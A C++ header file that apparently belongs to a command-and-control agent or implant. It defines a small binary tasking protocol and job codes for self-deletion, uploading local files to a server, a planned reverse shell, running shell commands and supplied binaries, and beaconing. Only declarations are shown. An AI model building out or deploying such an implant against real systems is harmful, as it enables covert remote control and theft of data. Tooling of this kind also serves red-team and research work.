#pragma once
#include "types.h"
/* Agent Job structure
 * 
 * To ensure that we keep a generally low footprint on the network, we aim to 
 * streamline the agent job tasking structure to make sure it is flexible and 
 * small. To achieve this we use 3 different components to a request:
 * 
 * 1. Job type: which is 1 byte long, providing 255 different operations 
 * 2. Data length: which is a 7 byte long integer, allowing up to a lot of data
 * 3. Raw data: which will include whatever else is required to complete the job
 *
 *     0      1                     ...                              7
 *  ____________________________________________________________________
 * |  Type  |                      Length                              |
 * ---------------------------------------------------------------------
 * |                            Payload                                |
 * ---------------------------------------------------------------------
 * We provide some helper functions below such that we can easily parse and 
 * handle those weird data things.
 */


// define our agent job types
#define AGENT_DIE 0                     // Agent terminates and deletes itself. No extra data
#define AGENT_SLEEP 1                   // Agent terminates and sleep for a set time. Data is num seconds stored as raw long
#define AGENT_DOWNLOAD_FILE 2           // Agent downloads file from server. Data is described in `net_file` structure
#define AGENT_UPLOAD_FILE 3             // Agent uploads file to server from local fs. Data is string of path to file
#define AGENT_REVERSE_SHELL 4           // Agent initiates a reverse shell. Data and process is still TBD
#define AGENT_EXECUTE_SHELLSCRIPT 5     // Agent executes a shell command. Data is string of command to execute
#define AGENT_EXECUTE_BINARY 6          // Agent executes a provided binary. Data is described in `net_file` structure
#define AGENT_SEND_BEACON 7             // Agent sends beacon information
#define AGENT_HEARTBEAT 8               // Agent sends beacon to prove its alive


// define response types for agent job statuses
#define AGENT_RESPONSE_OK 0 
#define AGENT_RESPONSE_FAIL_GENERIC 1
// define our agent job data structure for sending over the network

class AgentJob {
private:
    unsigned char type;  // type of the job 
    unsigned long len;   // the length of the raw data 
    void *data; // the actual raw data 
public: 
    AgentJob(unsigned char type, unsigned long len, void *data);
    AgentJob(unsigned long combined, void *data);
    AgentJob(ptask_t task);
    ~AgentJob();
    unsigned char get_type();
    unsigned long get_len();
    void *get_data();
    void set_data(void *data);
    unsigned long encode_header();
    static unsigned char *long_to_bytes(unsigned long v);
    static unsigned long bytes_to_long(unsigned char *t);
    void *pack();
};


// define some helper functions involved in the parsing and handling of the data



// define our networked file data structure
typedef struct _net_file {
    long fsize;         // the length of the file
    unsigned int psize; // the length of the path string
    char *path;         // path to save the file to (can be null for in-memory)
    void *data;         // raw data of the file
} net_file, *pnet_file;
